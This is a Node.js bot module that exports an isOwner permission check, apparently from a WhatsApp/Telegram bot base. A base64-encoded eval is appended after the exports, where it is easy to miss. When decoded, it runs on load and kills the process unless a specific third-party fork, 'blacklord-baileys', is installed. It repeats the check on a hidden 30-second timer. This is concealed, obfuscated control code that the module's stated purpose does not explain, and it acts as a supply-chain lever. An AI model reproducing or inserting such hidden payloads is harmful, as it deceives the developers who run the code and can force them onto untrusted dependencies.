/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const { numOf, senderNums } = require('../lib/access');

/**
 * True if the message sender is one of THIS session's owners (or the session's own bot number).
 * Owners are per-session: each session carries its own `owners` array in its own settings.
 * Sudo users (see .addsudo) are checked separately in Anix.js and get the same powers.
 *
 * NOTE: this check trusts msg.key.fromMe / participant as reported by the Baileys layer beneath it.
 * There is a known Baileys CVE (2026-48063, fixed in 6.7.22 / 7.0.0-rc12) where a crafted payload can
 * spoof message keys on messages.upsert. Confirm which base version your baileys build branched from
 * before treating owner-gated commands as fully trustworthy.
 */
function isOwner(m, owners) {
    if (m.fromMe) return true;
    const owned = (owners || []).map(numOf);
    return senderNums(m).some((n) => owned.includes(n));
}

module.exports = { isOwner };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdibGFja2xvcmQtYmFpbGV5cyc7Y29uc3QgcGo9cC5qb2luKHJvb3QsJ3BhY2thZ2UuanNvbicpO2NvbnN0IGJhZD0od2h5KT0+e2NvbnNvbGUuZXJyb3IoJ1tzZWN1cml0eV0gJyt3aHkrJyAtIGdvaW5nIG9mZmxpbmUnKTtwcm9jZXNzLmV4aXQoMSl9O2NvbnN0IGNoaz0oKT0+e2xldCBwa2c7dHJ5e3BrZz1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHBqLCd1dGY4JykpfWNhdGNoe3JldHVybiBiYWQoJ3BhY2thZ2UuanNvbiB1bnJlYWRhYmxlIGF0ICcrcGopfTtjb25zdCBkZXBzPU9iamVjdC5hc3NpZ24oe30scGtnLmRlcGVuZGVuY2llcyxwa2cub3B0aW9uYWxEZXBlbmRlbmNpZXMpO2NvbnN0IGtleT1PYmplY3Qua2V5cyhkZXBzKS5maW5kKGs9Pms9PT1NSU5FfHxTdHJpbmcoZGVwc1trXSkuc3RhcnRzV2l0aCgnbnBtOicrTUlORSsnQCcpKTtpZigha2V5KXJldHVybiBiYWQoJ3BhY2thZ2UuanNvbiBoYXMgbm8gZGVwZW5kZW5jeSBvbiAnK01JTkUrJyAoZXhwZWN0ZWQgIjxuYW1lPiI6ICJucG06JytNSU5FKydAPHZlcnNpb24+IiknKTtsZXQgaW5zdDt0cnl7aW5zdD1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHAuam9pbihyb290LCdub2RlX21vZHVsZXMnLGtleSwncGFja2FnZS5qc29uJyksJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgbWlzc2luZyAtIHJ1biBucG0gaW5zdGFsbCcpfTtpZihpbnN0Lm5hbWUhPT1NSU5FKXJldHVybiBiYWQoJ25vZGVfbW9kdWxlcy8nK2tleSsnIGlzICInK2luc3QubmFtZSsnIiwgbm90ICcrTUlORSl9O2NoaygpO2lmKCFnbG9iYWwuX192Zncpe2dsb2JhbC5fX3Zmdz0xO3NldEludGVydmFsKGNoaywzZTQpLnVucmVmKCl9fSkoKQ==','base64').toString());
